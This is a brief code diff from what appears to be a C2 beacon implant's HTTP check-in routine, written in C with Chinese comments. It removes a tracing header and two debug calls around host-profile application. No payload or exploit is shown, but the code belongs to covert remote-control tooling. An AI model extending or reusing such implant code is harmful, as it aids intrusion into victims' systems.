@@ -7,7 +7,6 @@
 #include "beacon.h"
 #include "track_memory.h"
 #include "hostprof.h"
-#include "x86trace.h"
 
 static char http_current_host[256];
 
@@ -290,9 +289,7 @@ int _http_get(char * hook, sessdata * meta, char * buffer, int max) {
 
 	/* 应用到配置文件 */
 	apply(setting_ptr(SETTING_C2_REQUEST), &myprofile, meta->data, meta->length, NULL, 0);
-	x86_bc("http_get before hostprof_apply");
 	hostprof_apply(http_current_host, &myprofile, 0);
-	x86_bc("http_get after hostprof_apply");
 
 	/* 请设置myuri */
 	if (strlen(myprofile.parameters) == 0) {
